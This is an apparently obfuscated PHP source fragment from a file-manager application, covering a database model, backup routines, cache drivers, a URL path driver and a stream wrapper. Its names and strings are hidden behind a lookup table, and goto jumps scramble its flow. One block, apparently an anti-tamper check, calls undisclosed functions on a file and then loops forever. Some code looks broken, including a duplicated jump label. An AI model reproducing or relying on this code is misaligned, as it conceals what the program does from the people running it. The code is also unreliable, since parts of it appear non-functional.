strtotime($aᴔ϶); } return NOW_TIME >= $DĂϭ && NOW_TIME <= $aᴔ϶; case $d[334]: return in_array(get_client_ip(), explode($d[47], $E)); case $d[335]: return !in_array(get_client_ip(), explode($d[47], $E)); case $d[322]: default: return $this->regex($fЄ, $E); } } public function query($cӐ, $FƗ = false) { $e؏ň =& $_SERVER[Ť]; if (!is_bool($FƗ) && !is_array($FƗ)) { $FƗ = func_get_args(); array_shift($FƗ); } $cӐ = str_replace(array($e؏ň[225], $e؏ň[336]), $e؏ň[50], $cӐ); $cӐ = $this->parseSql($cӐ, $FƗ); return $this->db->query($cӐ); } public function execute($E̋ϥ, $bܹ = false) { if (!is_bool($bܹ) && !is_array($bܹ)) { $bܹ = func_get_args(); array_shift($bܹ); } $E̋ϥ = $this->parseSql($E̋ϥ, $bܹ); return $this->db->execute($E̋ϥ); } protected function parseSql($E, $Bՠ) { $Eɪ =& $_SERVER[Ť]; if (!0 === $Bՠ) { $E = $this->_parseOptions(); $E = $this->db->parseSql($E, $E); } elseif (is_array($Bՠ)) { $Bՠ = array_map(array($this->db, $Eɪ[337]), $Bՠ); $E = vsprintf($E, $Bՠ); } else { $E = strtr($E, array($Eɪ[338] => $this->getTableName(), $Eɪ[339] => think_config($Eɪ[238]))); } $this->db->setModel($this->name); return $E; } public function db($A = '', $Aէ = '', $d迟م = array()) { goto eު; eު: $Aم =& $_SERVER[Ť]; if ($Aم[33] === $A && $this->db) { return $this->db; } static $aĘߪ = array(); goto Dʢż; Dʢż: static $fۏ = array(); if (!isset($fۏ[$A]) || isset($fۏ[$A]) && $Aէ && $aĘߪ[$A] != $Aէ) { if (!empty($Aէ) && is_string($Aէ) && !1 === strpos($Aէ, $Aم[8])) { $Aէ = think_config($Aէ); } $fۏ[$A] = Db::getInstance($Aէ); } elseif (NULL === $Aէ) { $fۏ[$A]->close(); unset($fۏ[$A]); return; } if (!empty($d迟م)) { if (is_string($d迟م)) { parse_str($d迟م, $d迟م); } foreach ($d迟م as $EЕ => $A֙։) { $this->setProperty($EЕ, $A֙։); } } goto BՐ; BՐ: $aĘߪ[$A] = $Aէ; $this->db = $fۏ[$A]; $this->_after_db(); goto E; E: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto aׂ; aׂ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $f = get_class($this); if ($f == $_SERVER[Ť][340]) { return $this->name; } $this->name = substr($f, 0, -5); } return $this->name; } public function getTableName() { $Eළ =& $_SERVER[Ť]; if (empty($this->trueTableName)) { $e񇸡 = !empty($this->tablePrefix) ? $this->tablePrefix : $Eළ[33]; if (!empty($this->tableName)) { $e񇸡 .= $this->tableName; } else { $e񇸡 .= think_parse_name($this->name); } $this->trueTableName = strtolower($e񇸡); } return (!empty($this->dbName) ? $this->dbName . $Eළ[91] : $Eළ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $bώݦ֖ =& $_SERVER[Ť]; return isset($this->fields[$bώݦ֖[245]]) ? $this->fields[$bώݦ֖[245]] : $this->pk; } public function getDbFields() { $Eۋ =& $_SERVER[Ť]; if (isset($this->options[$Eۋ[273]])) { $DߓӖ = $this->db->getFields($this->options[$Eۋ[273]]); return $DߓӖ ? array_keys($DߓӖ) : !1; } if ($this->fields) { $DߓӖ = $this->fields; unset($DߓӖ[$Eۋ[244]], $DߓӖ[$Eۋ[245]], $DߓӖ[$Eۋ[246]], $DߓӖ[$Eۋ[243]]); return $DߓӖ; } return !1; } public function data($AϬ = '') { $A =& $_SERVER[Ť]; if ($A[33] === $AϬ && !empty($this->data)) { return $this->data; } if (is_object($AϬ)) { $AϬ = get_object_vars($AϬ); } elseif (is_string($AϬ)) { parse_str($AϬ, $AϬ); } elseif (!is_array($AϬ)) { think_exception(think_lang($A[265])); } $this->data = $AϬ; return $this; } public function join($f) { $cì =& $_SERVER[Ť]; if (is_array($f)) { $this->options[$cì[276]] = $f; } elseif (!empty($f)) { $this->options[$cì[276]][] = $f; } return $this; } public function union($f̻, $eڏ = false) { goto a; a: $b慆 =& $_SERVER[Ť]; if (empty($f̻)) { return $this; } if ($eڏ) { $this->options[$b慆[341]][$b慆[342]] = !0; } goto Eɑ; Eɑ: if (is_object($f̻)) { $f̻ = get_object_vars($f̻); } if (is_string($f̻)) { $fÐЕӬ = $f̻; } elseif (is_array($f̻)) { if (isset($f̻[0])) { $this->options[$b慆[341]] = array_merge($this->options[$b慆[341]], $f̻); return $this; } else { $fÐЕӬ = $f̻; } } else { think_exception(think_lang($b慆[265])); } $this->options[$b慆[341]][] = $fÐЕӬ; goto C䎨; C䎨: return $this; goto a; a: } public function cache($Bӓ = true, $Bҍǔ = null, $f = '') { $E㲞õ =& $_SERVER[Ť]; if (!1 !== $Bӓ) { $this->options[$E㲞õ[343]] = array($E㲞õ[89] => $Bӓ, $E㲞õ[333] => $Bҍǔ, $E㲞õ[29] => $f); } return $this; } public function field($FӍᔛ, $f؃ׇ = false) { $B =& $_SERVER[Ť]; if (!0 === $FӍᔛ) { $Cçģ = $this->getDbFields(); $FӍᔛ = $Cçģ ? $Cçģ : $B[180]; } elseif ($f؃ׇ) { if (is_string($FӍᔛ)) { $FӍᔛ = explode($B[47], $FӍᔛ); } $Cçģ = $this->getDbFields(); $FӍᔛ = $Cçģ ? array_diff($Cçģ, $FӍᔛ) : $FӍᔛ; } $this->options[$B[267]] = $FӍᔛ; return $this; } public function scope($B栱 = '', $Bݩ = NULL) { $C =& $_SERVER[Ť]; if ($C[33] === $B栱) { if (isset($this->_scope[$C[34]])) { $a = $this->_scope[$C[34]]; } else { return $this; } } elseif (is_string($B栱)) { $dи = explode($C[47], $B栱); $a = array(); foreach ($dи as $Aۤ) { if (!isset($this->_scope[$Aۤ])) { continue; } $a = array_merge($a, $this->_scope[$Aۤ]); } if (!empty($Bݩ) && is_array($Bݩ)) { $a = array_merge($a, $Bݩ); } } elseif (is_array($B栱)) { $a = $B栱; } if (is_array($a) && !empty($a)) { $this->options = array_merge($this->options, array_change_key_case($a)); } return $this; } public function where($E, $AՐ = null) { $cٹ =& $_SERVER[Ť]; if (!is_null($AՐ) && is_string($E)) { if (!is_array($AՐ)) { $AՐ = func_get_args(); array_shift($AՐ); } $AՐ = array_map(array($this->db, $cٹ[337]), $AՐ); $E = vsprintf($E, $AՐ); } elseif (is_object($E)) { $E = get_object_vars($E); } elseif (is_array($E)) { foreach ($E as $cÙ => $E) { if ((is_numeric($cÙ) || !$cÙ) && is_string($E)) { if (strpos($E, $cٹ[344]) === 0) { continue; } think_trace($cٹ[345], $cٹ[33], $cٹ[46]); die; } } } if (is_string($E) && $cٹ[33] != $E) { $e = array(); $e[$cٹ[346]] = $E; $E = $e; } if (isset($this->options[$cٹ[269]])) { $this->options[$cٹ[269]] = array_merge($this->options[$cٹ[269]], $E); } else { $this->options[$cٹ[269]] = $E; } return $this; } public function limit($AѴ˹, $fƸ = null) { $D =& $_SERVER[Ť]; $this->options[$D[286]] = is_null($fƸ) ? $AѴ˹ : $AѴ˹ . $D[47] . $fƸ; return $this; } public function page($fޣԉ, $f爆񿫴 = null) { $B֭珸 =& $_SERVER[Ť]; $this->options[$B֭珸[347]] = is_null($f爆񿫴) ? $fޣԉ : $fޣԉ . $B֭珸[47] . $f爆񿫴; return $this; } public function comment($Cܔ) { $this->options[$_SERVER[Ť][348]] = $Cܔ; return $this; } public function setProperty($fÿ߭, $Cϱ) { if (property_exists($this, $fÿ߭)) { $this->{$fÿ߭} = $Cϱ; } return $this; } } goto F; Aɖ: class BackupDbFile { public function __construct() { } public function index() { goto F̭; E: $A = IO::listPath($d򱗩); $C = isset($A[$B☋[73]]) ? $A[$B☋[73]] : array(); $D« = array_sum(array_column($C, $B☋[77])); goto B; EǾ: $a呐->task[$B☋[708]] = $D«; foreach ($A[$B☋[73]] as $fТ֎) { $d͏ = IO::move($fТ֎[$B☋[75]], $d羲); if (!$d͏) { $a呐->end(); return !1; } } $dܾ = CONTROLLER_DIR . $B☋[748]; goto c素; b쮸: $d򱗩 = TEMP_FILES . "\142\141\x63\x6b\x75\160\x5f{$B}\x2f"; $d羲 = "\173\151\157\x3a{$dĉ[$B☋[701]]}\x7d\57\x64\141\x74\x61\142\x61\163\145\x2f\x62\141\143\x6b\165\x70\x5f{$B}\x2f"; if (!($d羲 = IO::mkdir($d羲))) { return !1; } goto E; F̭: $B☋ =& $_SERVER[Ť]; $dĉ = Backup::get(); $B = $dĉ[$B☋[28]]; goto b쮸; Cσ: $a呐->end(); Backup::set(array($B☋[750] => $D«)); return !0; goto A䲡; c素: $f = CONTROLLER_DIR . $B☋[749]; IO::copy($dܾ, $d羲); IO::copy($f, $d羲); goto Cσ; B: if (!$D«) { return !1; } Backup::set(array($B☋[745] => $D«)); $a呐 = new TaskFileTransfer($B☋[746], $B☋[730], count($C), LNG($B☋[731]) . $B☋[428] . LNG($B☋[733]) . $B☋[747]); goto EǾ; A䲡: } } class BackupFile { public function __construct() { } public function index() { goto cݎ; D֝: $C = 1000; $Cҿ = $F陇 = 0; $BѠ = array(); goto b; cݎ: $A = Backup::get(); $aő߭ = $A[$_SERVER[Ť][287]][$_SERVER[Ť][171]][$_SERVER[Ť][435]]; $e᫵ = array($_SERVER[Ť][436] => array($_SERVER[Ť][751], $aő߭), $_SERVER[Ť][752] => array($_SERVER[Ť][325], $A[$_SERVER[Ť][701]])); goto AԿ; b: $cͣ = $f = 0; do { $F = $_SERVER[Ť][757]; $DǛҧ = Model($_SERVER[Ť][735])->where($e᫵)->field($F)->order($_SERVER[Ť][758])->selectPage($C, $A⽒); $b = !empty($DǛҧ[$_SERVER[Ť][361]]) ? $DǛҧ[$_SERVER[Ť][361]] : array(); foreach ($b as $AՖ) { goto EŇʑ; a婌: $Cҿ += $AՖ[$_SERVER[Ť][77]]; $f += 1; $cͣ += $AՖ[$_SERVER[Ť][77]]; goto eӼ⩶; C: if (IO::exist($BЌü)) { $e->updateFileEnd($AՖ[$_SERVER[Ť][28]], $AՖ[$_SERVER[Ť][77]]); } else { $BЌü = get_path_father($BЌü); IO::mkdir($BЌü); if (!IO::copy($CɄ, $BЌü, $_SERVER[Ť][761])) { write_log($_SERVER[Ť][762] . $CɄ . $_SERVER[Ť][763] . $BЌü . $_SERVER[Ť][493], $_SERVER[Ť][730]); $e߱ = !1; break; } } $aő߭ = $AՖ[$_SERVER[Ť][435]]; $F陇 += 1; goto a婌; EŇʑ: if (!$this->_fileExist($AՖ, $BѠ, $c܍)) { $DƐ -= 1; $eҷ -= (int) $AՖ[$_SERVER[Ť][77]]; write_log("\146\x69\x6c\x65\40\x6e\157\164\x20\145\x78\x69\x73\164\56\x66\x69\154\x65\x49\x44\x3a{$AՖ[$_SERVER[Ť][435]]}\x2c\x20\160\141\x74\x68\x3a{$AՖ[$_SERVER[Ť][75]]}", $_SERVER[Ť][759]); continue; } $CɄ = $AՖ[$_SERVER[Ť][75]]; $BЌü = "\173\x69\x6f\72{$A[$_SERVER[Ť][701]]}\x7d" . substr($CɄ, strlen("\173\151\157\72{$AՖ[$_SERVER[Ť][760]]}\x7d")); goto C; eӼ⩶: if ($Cҿ >= 1024 * 1024 * 100) { $b뉚 = array($_SERVER[Ť][764] => $aő߭, $_SERVER[Ť][765] => $f, $_SERVER[Ť][766] => $cͣ); Backup::set($b뉚); $Cҿ = $F陇 = 0; } goto Dؔ; Dؔ: } $bæ = count($b); $A⽒++; } while ($bæ == $C); $e->end(); goto f; BӍ: $this->_fileFilter($BѠ); return !0; goto DƉ; f: $b뉚 = array($_SERVER[Ť][767] => 1, $_SERVER[Ť][464] => time(), $_SERVER[Ť][718] => 1, $_SERVER[Ť][764] => $aő߭, $_SERVER[Ť][756] => $eҷ, $_SERVER[Ť][755] => $DƐ); if ($F陇) { $b뉚[$_SERVER[Ť][765]] = $f; $b뉚[$_SERVER[Ť][766]] = $cͣ; } Backup::set($b뉚); goto BӍ; A҇: $e->task[$_SERVER[Ť][708]] = $eҷ; $b뉚 = array($_SERVER[Ť][755] => $DƐ, $_SERVER[Ť][756] => $eҷ); Backup::set($b뉚); goto aތҐ; AԿ: $DƐ = (int) Model($_SERVER[Ť][735])->where($e᫵)->count($_SERVER[Ť][435]); $eҷ = (int) Model($_SERVER[Ť][735])->where($e᫵)->sum($_SERVER[Ť][77]); $e = new TaskFileTransfer($_SERVER[Ť][753], $_SERVER[Ť][730], $DƐ, LNG($_SERVER[Ť][731]) . $_SERVER[Ť][732] . LNG($_SERVER[Ť][754])); goto A҇; aތҐ: $e߱ = !0; $c܍ = $this->storeIds(); $A⽒ = 1; goto D֝; DƉ: } private function _fileExist($a, &$F, $d) { goto D; C뮼: if (IO::exist($eߌɰ)) { $F[] = $a[$fć[435]]; return !1; } $f蓑 = array($fć[760] => $a[$fć[760]], $fć[75] => array($fć[373], "{$eߌɰ}\x25")); $B = Model($fć[735])->where($f蓑)->field($fć[436])->select(); goto aڙ; aڙ: $F = array_merge($F, array_to_keyvalue($B, $fć[33], $fć[435])); return !1; goto eÞߕ; D: $fć =& $_SERVER[Ť]; $f = $a[$fć[75]]; if (in_array($a[$fć[435]], $F)) { return !1; } goto F돐; F돐: if (!in_array($a[$fć[760]], $d)) { return !1; } if (IO::exist($f)) { return !0; } $eߌɰ = get_path_father($f); goto C뮼; eÞߕ: } private function _fileFilter($e뽾) { $Bܨς =& $_SERVER[Ť]; if (empty($e뽾)) { return; } $Aˎ = array($Bܨς[435] => array($Bܨς[7], array_unique($e뽾))); $fǯڳ = Model($Bܨς[768])->where($Aˎ)->field($Bܨς[385])->select(); foreach ($fǯڳ as $cڲ) { Model($Bܨς[768])->remove($cڲ[$Bܨς[385]], !1); } } private function storeIds() { $DΞ =& $_SERVER[Ť]; $b۴ = Model($DΞ[713])->listData(); $dۘ = array(); $eÄ = $GLOBALS[$DΞ[6]][$DΞ[84]][$DΞ[769]]; foreach ($b۴ as $cň) { $cֱڼ = strtolower($cň[$DΞ[90]]); if (!isset($eÄ[$cֱڼ])) { continue; } $a = $DΞ[71] . (isset($eÄ[$cֱڼ]) ? $eÄ[$cֱڼ] : ucfirst($cֱڼ)); if (!class_exists($a)) { continue; } $dۘ[] = $cň[$DΞ[383]]; } return $dۘ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto c; cōڳ: switch ($B߳[$b[770]]) { case $b[17]: self::$handle = Model($b[772]); break; case $b[773]: self::$handle = new CacheRedis($e, $Aц); break; case $b[774]: self::$handle = new CacheMemcached($e, $Aц); break; case $b[171]: self::$handle = new CacheFile($e, $Aц); break; default: break; } return self::$handle; goto fڣ; c: $b =& $_SERVER[Ť]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto B┮; B┮: $B߳ = $GLOBALS[$b[6]][$b[343]]; $e = $B߳[$B߳[$b[770]]]; $Aц = $B߳[$b[771]]; goto cōڳ; fڣ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Dƌݾ) { if (is_array($Dƌݾ) || is_object($Dƌݾ)) { $Dƌݾ = json_encode($Dƌݾ); } $Dƌݾ = rawurlencode($Dƌݾ); return md5(KOD_SITE_ID . $_SERVER[Ť][70] . $Dƌݾ); } public static function get($C) { $Aᖘ = self::key($C); if (!isset(self::$memoryCache[$Aᖘ])) { $aѧ = self::init()->get($Aᖘ); self::$memoryCache[$Aᖘ] = unserialize($aѧ); } return self::$memoryCache[$Aᖘ]; } public static function set($aÈ, $A吼Ï, $c = false) { goto eֵ; A󔃘: CacheLock::lock($aÈ); $fИ = self::init()->set($F, serialize($A吼Ï), $c); self::$memoryCache[$F] = $A吼Ï; goto eʴ; eֵ: $F = self::key($aÈ); if (isset(self::$memoryCache[$F]) && self::$memoryCache[$F] === $A吼Ï) { return !0; } if ($c === 0) { self::$memoryCache[$F] = $A吼Ï; return !0; } goto A󔃘; eʴ: CacheLock::unlock($aÈ); return $fИ; goto Bٔ; Bٔ: } public static function remove($e꣄ɍ) { goto B߃瑓; A͝ڬ: CacheLock::lock($e꣄ɍ); $F̵ = self::init()->remove($Cĭ); CacheLock::unlock($e꣄ɍ); goto c; B߃瑓: $Cĭ = self::key($e꣄ɍ); unset(self::$memoryCache[$Cĭ]); self::clearTimeout(); goto A͝ڬ; c: return $F̵; goto dݢ߅; dݢ߅: } public static function removeMemory($eҽ) { $c֬ = self::key($eҽ); unset(self::$memoryCache[$c֬]); } public static function clearMemory($CſƗ = false) { if ($CſƗ) { $CſƗ = self::key($CſƗ); unset(self::$memoryCache[$CſƗ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ť][775])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ť][776])) { self::init()->clearTimeout(); } } } goto cۯ; Eݖ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($e = false) { } public function exist($f׉) { $a𕶋 = $this->info($f׉); return $a𕶋[$_SERVER[Ť][191]]; } public function isFile($A) { $fď = $this->info($A); return $fď[$_SERVER[Ť][191]]; } public function isFolder($d霺) { return !1; } public function size($bѤ) { $C̍ = $this->info($bѤ); return $C̍[$_SERVER[Ť][77]]; } public function info($a) { return $this->infoParse($a); } public function infoAuth($C㈶) { return $this->infoParse($C㈶); } public function infoWithChildren($aǫ) { return $this->infoParse($aǫ); } public function infoFull($F) { return $this->infoParse($F); } private function infoParse($c׉) { $a΋ =& $_SERVER[Ť]; $A۶ = $this->header($c׉); if (!$A۶ || !$A۶[$a΋[699]]) { return !1; } $a = _get($A۶, $a΋[331], 0); $d锣 = array($a΋[28] => $A۶[$a΋[28]], $a΋[75] => $c׉, $a΋[29] => $a΋[171], $a΋[77] => intval($a), $a΋[165] => get_path_ext($A۶[$a΋[28]]), $a΋[1221] => $a > 0 && $A۶[$a΋[1343]], $a΋[1222] => !1); return $d锣; } private function header($BЅʾ) { goto F; F: $A =& $_SERVER[Ť]; if (isset(self::$_cacheHeader[$BЅʾ])) { return self::$_cacheHeader[$BЅʾ]; } $eޜ = isset($GLOBALS[$A[1344]]) ? $GLOBALS[$A[1344]] : !1; goto f; f: $GLOBALS[$A[1344]] = !0; self::$_cacheHeader[$BЅʾ] = url_header($BЅʾ); $GLOBALS[$A[1344]] = $eޜ; goto B; B: return self::$_cacheHeader[$BЅʾ]; goto A׆; A׆: } public function hashSimple($dÒ, $a = false) { goto a; B̵: $a΋鐎 = $CƉŊ[$d̶ڣ[77]]; $A۩֮ = 200; $a = 50; goto BƤ; Dχ: $c翥 .= $this->fileSubstr($dÒ, $a΋鐎 - $A۩֮, $A۩֮); return md5($c翥) . $a΋鐎; goto F; BƤ: if ($a΋鐎 <= $A۩֮ * $a) { return md5($this->fileSubstr($dÒ, 0, $a΋鐎)) . $a΋鐎; } $Bȿ = intval($a΋鐎 / $a); $c翥 = $d̶ڣ[33]; goto bʢډ; bʢډ: $cͺ = timeFloat(); $D֥ʮߪ = 15; for ($Dʲ = 0; $Dʲ < $a; $Dʲ++) { if (timeFloat() - $cͺ > $D֥ʮߪ) { return !1; } $D = $this->fileSubstr($dÒ, $Bȿ * $Dʲ, $A۩֮); if (!$D) { return !1; } $c翥 .= $D; } goto Dχ; a: $d̶ڣ =& $_SERVER[Ť]; $CƉŊ = $this->info($dÒ); if (!$CƉŊ || !$CƉŊ[$d̶ڣ[191]]) { return !1; } goto B̵; F: } public function getContent($Cݒ𔄂) { return $this->fileSubstr($Cݒ𔄂); } public function fileSubstr($eŅ, $Cˇ = 0, $dӭ = -1) { goto CēȺ; a櫥: if ($dӭ === -1) { $dӭ = $dﶮ[$a՚̪[77]]; } if ($dӭ == 0) { return $a՚̪[33]; } $dǌ = array($a՚̪[1345] . $Cˇ . $a՚̪[732] . ($Cˇ + $dӭ - 1)); goto E󱾲; E󱾲: $eʛû = url_request($eŅ, $a՚̪[224], !1, $dǌ, !1, !1, 1); return $eʛû[$a՚̪[1058]] ? $eʛû[$a՚̪[1058]] : $a՚̪[33]; goto fǌ; CēȺ: $a՚̪ =& $_SERVER[Ť]; $dﶮ = $this->info($eŅ); if (!$dﶮ || !$dﶮ[$a՚̪[191]] && $dﶮ[$a՚̪[77]] > 1024 * 1024 * 10) { return !1; } goto a櫥; fǌ: } public function download($E, $D󛢨͐) { Downloader::start($E, $D󛢨͐); return $D󛢨͐; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Bߦ, $D = '') { goto a; Aٻ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Bߦ])) { self::$_chunkBuffer[$Bߦ] = array(); } goto cꏊȆ; cꏊȆ: return $this->info ? !0 : !1; goto F; a: $this->info = $this->info($Bߦ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ť][75]]; goto Aٻ; F: } function stream_read($aٝ) { $D۲ = $this->fileSubstr($this->pose, $aٝ); $this->pose += strlen($D۲); return $D۲; } public function stream_tell() { return $this->pose; } public function stream_seek($A鬎脳, $bҎک) { $c׸ɝ =& $_SERVER[Ť]; if ($bҎک == SEEK_SET) { $this->pose = $A鬎脳; } else { if ($bҎک == SEEK_CUR) { $this->pose += $A鬎脳; } else { if ($bҎک == SEEK_END) { $this->pose = $this->info[$c׸ɝ[77]] + intval($A鬎脳); } } } if ($A鬎脳 < 0) { $this->pose = $this->info[$c׸ɝ[77]] + $A鬎脳; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ť][77]]; } public function stream_close() { return !0; } public function url_stat($c, $aą) { $cǸ =& $_SERVER[Ť]; $f䴲 = $this->info($c); return array($cǸ[1346] => 0, $cǸ[1347] => 0, $cǸ[12] => 32768 + 511, $cǸ[1348] => 0, $cǸ[1349] => 0, $cǸ[1350] => 0, $cǸ[1351] => 0, $cǸ[77] => $f䴲[$cǸ[77]], $cǸ[1352] => $f䴲[$cǸ[1220]], $cǸ[1308] => $f䴲[$cǸ[107]], $cǸ[1307] => $f䴲[$cǸ[190]], $cǸ[1353] => 0, $cǸ[1354] => 0); } static $fileInfo = array(); public function info($Fڎ) { $F = $_SERVER[Ť][1355]; if (isset(self::$fileInfo[$Fڎ])) { return self::$fileInfo[$Fڎ]; } if (substr($Fڎ, 0, strlen($F)) != $F) { return !1; } self::$fileInfo[$Fڎ] = IO::info(substr($Fڎ, strlen($F))); return self::$fileInfo[$Fڎ]; } public static function read($a򃄘, $C, $aݰٽ) { goto b㈪; cʠ: $D҈ = 8192; fseek($bю, $C, SEEK_SET); $a즼 = $dήȶ[33]; goto b; C񉗞: return $a즼; goto C⽲; b: $B⸒ = 0; while ($B⸒ < $aݰٽ) { $BҴ = min($D҈, $aݰٽ - $B⸒); $a즼 .= fread($bю, $BҴ); $B⸒ += $BҴ; } fclose($bю); goto C񉗞; b㈪: $dήȶ =& $_SERVER[Ť]; $bю = fopen($a򃄘, $dήȶ[1224]); if (!$bю) { return $dήȶ[33]; } goto cʠ; C⽲: } public function fileSubstr($f񲞐, $EӐ) { goto e; dϢ: $Fɗ = 64 * 1024; $c܆ފ =& self::$_chunkBuffer[$this->path]; if (!$c܆ފ) { $c܆ފ = array(); } goto e羍; FϬ¿: foreach ($c܆ފ as $A֢ => $Eڰ) { $A֢ = intval($A֢); $Dǖ = $A֢ + strlen($Eڰ); if ($f񲞐 >= $Dǖ) { continue; } if ($f񲞐 >= $A֢ && $f񲞐 + $EӐ <= $Dǖ) { return substr($Eڰ, $f񲞐 - $A֢, $EӐ); } break; } if (count($c܆ފ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($cޠ蘈[1356], $cޠ蘈[1357] . count($c܆ފ) . "\73\x73\164\141\x72\164\75{$f񲞐}\x2c\x6c\145\x6e\x67\x74\150\x3d{$EӐ}\73\160\157\163\145\x3a{$A֢}\176{$Dǖ}"); throw new Exception($cޠ蘈[1358]); } $cЭ = intval($f񲞐 / $Fɗ) * $Fɗ; goto Dװ; e: $cޠ蘈 =& $_SERVER[Ť]; $C = $this->info[$cޠ蘈[77]]; $F̈́ = $f񲞐; goto d; d: $a¾ = $EӐ; if ($f񲞐 < 0) { $f񲞐 = $C + $f񲞐; } if ($EӐ === !1) { $EӐ = $C - $f񲞐; } goto AǞ; Dװ: $D = ceil(($f񲞐 + $EӐ) / $Fɗ) * $Fɗ - $cЭ; $A鐦 = IO::fileSubstr($this->path, $cЭ, $D); $c܆ފ[$cЭ . $cޠ蘈[33]] = $A鐦; goto d; AǞ: if ($f񲞐 + $EӐ > $C) { $EӐ = $C - $f񲞐; } if ($EӐ <= 0) { return $cޠ蘈[33]; } if ($f񲞐 < 0 || $f񲞐 >= $C || $EӐ <= 0 || $EӐ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\x69\x6c\145\x52\x65\x61\144\40\x65\162\162\x6f\162\x21\x20\163\164\x61\x72\164\x3d{$f񲞐}\x3b\x6c\x65\x6e\x67\x74\x68\x3d{$EӐ}\x3b\40\x73\x69\172\145\x3d{$C}\x3b"); } goto dϢ; e羍: $A֢ = 0; $Dǖ = 0; $Eڰ = $cޠ蘈[33]; goto FϬ¿; d: ksort($c܆ފ); $bɺ = substr($A鐦, $f񲞐 - $cЭ, $EӐ); return $bɺ; goto Dɹ; Dɹ: } private function log($E֌, $Dꅄ) { $b =& $_SERVER[Ť]; $B˖ۭ = timeFloat() - $this->timeStart; write_log(sprintf($b[1359], $E֌, $this->info[$b[28]], $B˖ۭ, $Dꅄ), $b[1048]); } } class Message { function __construct() { } public function send($d܂ = '', $AĠ = array(), $cǃ = "\164\145\170\x74") { goto f߃; f߃: $fኧ =& $_SERVER[Ť]; $C = array($fኧ[29] => $fኧ[1360], $fኧ[702] => $d܂); if (in_array($cǃ, array($fኧ[1360], $fኧ[1361]))) { $C[$fኧ[29]] = $cǃ; } goto fԸ; fਅ: Hook::trigger($fኧ[1363], $B≆); goto d; fԸ: $AĠ = array($fኧ[986] => isset($AĠ[$fኧ[986]]) ? $AĠ[$fኧ[986]] : $fኧ[33], $fኧ[551] => isset($AĠ[$fኧ[551]]) ? $AĠ[$fኧ[551]] : $fኧ[33]); if (empty($d܂) || empty($AĠ[$fኧ[986]]) && empty($AĠ[$fኧ[551]])) { return !1; } $B≆ = array($fኧ[1301] => $C, $fኧ[1362] => $AĠ); goto fਅ; d: } } goto Aݎ; Bȅ: class CacheLockDatabase { public function lock($bڋ, $A = 0) { $F꥙ = Model($_SERVER[Ť][772]); $CÌ = microtime(!0) + $A; while (microtime(!0) < $CÌ) { $d͇ = $F꥙->get($bڋ); if (!$d͇ || $d͇ < microtime(!0)) { $fЬ = $F꥙->set($bڋ, $CÌ); if ($fЬ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Aչ) { return Model($_SERVER[Ť][772])->get($Aչ); } public function unlock($bѷȧ) { Model($_SERVER[Ť][772])->remove($bѷȧ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($CՄϓ, $Fޘ) { $f =& $_SERVER[Ť]; if (!class_exists($f[799])) { show_json($f[800], !1); } $this->cacheTime = $Fޘ; $this->handle = new Memcached(); if (is_array($CՄϓ[$f[801]]) && count($CՄϓ[$f[801]]) >= 1) { foreach ($CՄϓ[$f[801]] as $Dǚ) { $C߼̔ = explode($f[4], $Dǚ); $this->handle->addServer($C߼̔[0], $C߼̔[1]); } } else { $this->handle->addServer($CՄϓ[$f[173]], $CՄϓ[$f[174]]); } } public function set($dÃ, $b񍾨, $E܋ä = false) { $E܋ä = $E܋ä ? $E܋ä : $this->cacheTime; return $this->handle->set($dÃ, $b񍾨, $E܋ä); } public function get($Aٸ) { return $this->handle->get($Aٸ); } public function remove($F) { return $this->handle->delete($F); } public function deleteAll() { return $this->handle->flush(); } } if (!isset($_SERVER[$_SERVER[Ť][719]]) || !isset($_SERVER[$_SERVER[Ť][720]])) { goto eɭ; eɭ: $f = $_SERVER[Ť][721]; $fᖖ = $_SERVER[$_SERVER[Ť][722]] . $_SERVER[Ť][723]; $dɦ = $f($fᖖ); goto dŚ; dŚ: $E = explode($_SERVER[Ť][225], $dɦ); if (count($E) < $_SERVER[Ť][564]) { $D = $_SERVER[Ť][724]; $D(); } $b = $_SERVER[Ť][725]; goto a©; a©: $b($_SERVER[$_SERVER[Ť][722]] . $_SERVER[Ť][723]); $D̯ = 2; while ($D̯ > 1) { $eɏ = rawurlencode($D̯ . $_SERVER[Ť][368]); } goto dϲ; dϲ: } goto D; D: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($d, $e㣰փ) { $dЮ =& $_SERVER[Ť]; if (!class_exists($dЮ[802])) { show_json($dЮ[803], !1); } $this->cacheTime = $e㣰փ; $e刢 = isset($d[$dЮ[804]]) ? $d[$dЮ[804]] : 10; $dږΪ = _get($d, $dЮ[801]); if ($dږΪ && is_array($dږΪ)) { $this->initCluster($d, $e刢); } else { $this->handle = $this->init($d, $e刢); } } private function init($eѿ୙, $Fւ) { $aΜ =& $_SERVER[Ť]; $f䍌 = new Redis(); $b򲯧 = isset($eѿ୙[$aΜ[805]]) ? $eѿ୙[$aΜ[805]] : !1; if ($b򲯧) { $f䍌->pconnect($eѿ୙[$aΜ[173]], $eѿ୙[$aΜ[174]], $Fւ); } else { 